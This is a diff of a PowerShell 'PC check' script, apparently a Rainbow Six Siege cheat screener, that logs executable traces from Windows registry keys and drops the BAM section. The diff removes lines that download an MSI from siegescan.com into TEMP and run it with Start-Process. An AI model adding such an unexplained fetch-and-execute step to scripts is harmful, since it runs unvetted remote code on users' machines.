@@ -147,37 +147,20 @@ function List-BAMStateUserSettings {
     $outputFile = Join-Path -Path $desktopPath -ChildPath "PcCheckLogs.txt"
     if (Test-Path $outputFile) { Clear-Content $outputFile }
     $loggedPaths = @{}
-     Write-Host " Fetching UserSettings Entries " -ForegroundColor Blue
-    # Log entries from bam\State\UserSettings
-    $registryPath = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
-    $userSettings = Get-ChildItem -Path $registryPath | Where-Object { $_.Name -like "*1001" }
 
-    if ($userSettings) {
-        foreach ($setting in $userSettings) {
-            Add-Content -Path $outputFile -Value "`n$($setting.PSPath)"
-            $items = Get-ItemProperty -Path $setting.PSPath | Select-Object -Property *
-            foreach ($item in $items.PSObject.Properties) {
-                if (($item.Name -match "exe" -or $item.Name -match ".rar") -and -not $loggedPaths.ContainsKey($item.Name)) {
-                    Add-Content -Path $outputFile -Value (Format-Output $item.Name $item.Value)
-                    $loggedPaths[$item.Name] = $true
-                }
-            }
-        }
-    } else {
-        Write-Host "No relevant user settings found." -ForegroundColor Red
-    }
-Write-Host "Fetching Compatibility Assistant Entries"
-    # Log entries from Compatibility Assistant Store
+    Write-Host "Skipping BAM UserSettings Entries" -ForegroundColor Yellow
+
+    Write-Host "Fetching Compatibility Assistant Entries"
     $compatRegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
-    $compatEntries = Get-ItemProperty -Path $compatRegistryPath
+    $compatEntries = Get-ItemProperty -Path $compatRegistryPath -ErrorAction SilentlyContinue
     $compatEntries.PSObject.Properties | ForEach-Object {
         if (($_.Name -match "exe" -or $_.Name -match ".rar") -and -not $loggedPaths.ContainsKey($_.Name)) {
             Add-Content -Path $outputFile -Value (Format-Output $_.Name $_.Value)
             $loggedPaths[$_.Name] = $true
         }
     }
-Write-Host "Fetching AppsSwitched Entries" -ForegroundColor Blue
-    # Log entries from FeatureUsage\AppSwitched
+
+    Write-Host "Fetching AppsSwitched Entries" -ForegroundColor Blue
     $newRegistryPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched"
     if (Test-Path $newRegistryPath) {
         $newEntries = Get-ItemProperty -Path $newRegistryPath
@@ -188,8 +171,8 @@ Write-Host "Fetching AppsSwitched Entries" -ForegroundColor Blue
             }
         }
     }
-Write-Host "Fetching MuiCache Entries" -ForegroundColor Blue
-    # Log entries from MuiCache
+
+    Write-Host "Fetching MuiCache Entries" -ForegroundColor Blue
     $muiCachePath = "HKCR:\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
     if (Test-Path $muiCachePath) {
         $muiCacheEntries = Get-ChildItem -Path $muiCachePath
@@ -204,8 +187,7 @@ Write-Host "Fetching MuiCache Entries" -ForegroundColor Blue
     Get-Content $outputFile | Sort-Object | Get-Unique | Where-Object { $_ -notmatch "\{.*\}" } | ForEach-Object { $_ -replace ":", "" } | Set-Content $outputFile
 
     Log-BrowserFolders
-    # Remove the placeholder Log-MUICacheEntries function call if not defined elsewhere
-  
+
     $folderNames = Log-FolderNames | Sort-Object | Get-Unique
     Add-Content -Path $outputFile -Value "`n-----------------"
     Add-Content -Path $outputFile -Value "`nR6 Usernames:"
@@ -218,6 +200,7 @@ Write-Host "Fetching MuiCache Entries" -ForegroundColor Blue
         Start-Sleep -Seconds 0.5
     }
 }
+
 Write-Host " Fetching Downloaded Browsers " -ForegroundColor Blue
 function Log-BrowserFolders {
     Write-Host "Logging reg entries inside PowerShell..." -ForegroundColor DarkYellow
@@ -285,26 +268,14 @@ $targetFileDownloads = Join-Path -Path $downloadsPath -ChildPath "PcCheck.txt"
 Delete-FileIfExists -filePath $targetFileDesktop
 Delete-FileIfExists -filePath $targetFileDownloads
 
-$exeUrl  = "https://siegescan.com/drives.msi"
-$exePath = "$env:TEMP\drives.msi"
-
-Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
-
-Start-Process $exePath
-
 
 # Define colors
 $yellow = "Yellow"
 $space = " " * 12  # Increased the number of spaces for more right alignment
 
-# Print the red "SCAN COMPLETE" line with more white space to the right
-Write-Host "`n$space╭─────────────────────────────────────╮" -ForegroundColor $yellow
-Write-Host "$space│            SCAN COMPLETE            │" -ForegroundColor $yellow
+
+# Print the completion banner
+Write-Host ""
+Write-Host "$space╭─────────────────────────────────────╮" -ForegroundColor $yellow
+Write-Host "$space│    SCAN COMPLETE - Siege Scan v1.2  │" -ForegroundColor $yellow
 Write-Host "$space╰─────────────────────────────────────╯" -ForegroundColor $yellow
-
-
-
-
-
-
-
